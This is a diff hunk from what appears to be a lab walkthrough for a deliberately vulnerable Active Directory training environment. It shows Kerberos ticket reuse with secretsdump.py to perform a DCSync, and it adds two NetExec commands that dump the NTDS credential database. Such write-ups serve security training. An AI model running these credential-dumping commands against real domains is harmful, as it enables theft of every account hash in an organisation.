@@ -68,6 +68,8 @@ DCSync by presenting the service ticket
 ```bash
 export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
 secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenking
+nxc smb meereen.essos.local -k --use-kcache
+nxc smb meereen.essos.local -k --use-kcache --ntds
 ```
 
 Clean up by deleting the computer we created with the administrator account hash we just get
